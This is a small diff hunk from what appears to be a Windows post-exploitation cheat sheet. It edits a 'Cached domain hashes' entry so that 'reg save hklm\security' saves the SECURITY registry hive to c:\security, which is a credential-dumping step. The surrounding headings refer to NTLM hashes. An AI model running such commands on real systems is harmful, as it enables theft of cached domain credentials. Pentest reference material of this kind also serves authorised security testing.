@@ -2176,7 +2176,7 @@ whoami /all #BUILTIN\Administrators
 ````
 ##### Cached domain hashes
 ````
-reg save hklm\security security
+reg save hklm\security c:\security
 ````
 ##### local admin and users ntlm
 ````
